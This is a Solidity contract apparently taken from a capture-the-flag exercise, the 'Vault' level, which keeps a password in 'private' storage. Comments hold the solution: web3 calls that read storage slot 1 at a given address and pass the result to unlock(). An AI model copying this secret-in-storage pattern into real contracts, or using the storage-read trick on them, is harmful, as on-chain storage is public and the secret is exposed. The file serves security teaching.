// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked; //0
  bytes32 private password; //1

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

//var pwd = await web3.eth.getStorageAt("0xE65BFC34Bee311CaCf3E2FB481D9f80Ee4fD8939", 1)
//var pwdAsString = web3.utils.toAscii(pwd) 
//await contract.unlock(pwd)
  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
